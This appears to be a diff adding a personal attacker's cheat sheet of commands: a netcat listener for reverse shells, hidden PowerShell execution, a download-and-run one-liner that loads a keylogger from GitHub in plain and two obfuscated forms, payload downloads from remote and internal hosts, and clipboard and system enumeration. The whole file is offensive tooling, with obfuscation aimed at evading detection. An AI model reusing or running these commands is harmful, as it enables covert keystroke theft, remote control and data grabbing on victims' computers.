@@ -1,0 +1,89 @@
+///////////Connect two linode shell
+ssh root@45.79.93.151
+
+
+
+/////Listening Host for reverse shell
+
+sudo nc -lvnp 87 -s 45.79.93.151
+
+/////open working hidden
+PowerShell -WindowStyle Hidden -File E:\Shell\working.ps1
+
+
+
+
+////////////Keylogger
+
+////////if using win + r
+powershell -nop -w hidden IEX("(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1')")
+
+////////from terminal-obfuscated
+('powersh'+'e'+'ll -nop -'+'w hidden '+'IEX(iAc('+'n'+'e'+'w-object ne'+'t'+'.w'+'ebclient)'+'.download'+'st'+'rin'+'g(zM6'+'ht'+'tps:/'+'/raw.githubusercontent.com/'+'secu'+'r'+'ethe'+'logs/Keylogge'+'r'+'/master/Keylogger.ps1z'+'M6)'+'iAc)').rePLacE('zM6',[STrIng][chAR]39).rePLacE('iAc',[STrIng][chAR]34)|& ( $PSHoMe[21]+$PsHOme[34]+'x')
+
+
+//////from terminal obfuscated-2
+-JoIN[ChAR[]]( 112 ,111, 119 , 101,114, 115 , 104 ,101 ,108 ,108 ,32, 45,110,111, 112, 32 ,45 ,119 , 32 ,104 , 105,100 ,100,101,110, 32 , 73 , 69 ,88,40 , 34, 40 ,110 ,101 , 119 , 45 , 111 ,98 ,106 , 101, 99 ,116 ,32 ,110 ,101 ,116 ,46,119 , 101, 98, 99,108, 105 ,101 ,110 , 116 ,41, 46, 100 , 111 ,119, 110 ,108,111 ,97 , 100, 115, 116 , 114 , 105 , 110, 103, 40,39 , 104 ,116,116,112 ,115 , 58 ,47 , 47,114 ,97,119 ,46, 103, 105 ,116 , 104 ,117 ,98, 117,115 ,101,114, 99,111,110, 116, 101,110 , 116 ,46,99 , 111,109 ,47, 115 ,101, 99 ,117,114, 101, 116,104,101, 108 ,111, 103,115, 47 , 75,101 , 121, 108,111 , 103 , 103 , 101,114,47,109, 97 , 115 , 116 , 101,114 ,47 ,75 ,101, 121 ,108,111, 103,103,101 ,114,46, 112 ,115 , 49 ,39 ,41, 34 , 41 )| & ( $psHomE[21]+$PshoMe[30]+'X')
+
+
+
+////////////Powershell commands
+
+////bruoise to directory
+cd c:\
+
+////Open file in terminal - nano equivelent
+Get-Content C:
+
+
+
+
+/////////////Commands/////////////
+
+/////message
+& {[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Pato quack quack','WARNING')}
+
+/////Download file
+Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
+
+/////Shutdown computer
+Stop-Computer -ComputerName localhost
+
+/////Log off
+logoff
+
+/////Get clipboard
+Get-Clipboard
+
+/////Get computer info
+Get-ComputerInfo
+
+/////Get local user
+Get-LocalUser
+
+/////Get public ip address
+Invoke-RestMethod -Uri ('https://ipinfo.io/')
+///Full
+Get-NetIPAddress
+
+/////Get services
+Get-Service
+
+/////Download and save file
+Invoke-WebRequest -Uri "https://marcahoy.infinityfreeapp.com/ps.txt"  -OutFile "C:\temp\text.txt"
+
+/////open file or image
+C:\temp\xxxxxx.xxx
+
+//////Open program
+& 'C:\path to program' 
+
+
+
+//////////////////tricks///////////////////
+
+////Open window maximised
+-WindowStyle maximized
+
+///Open window hidden
+-WindowStyle Hidden
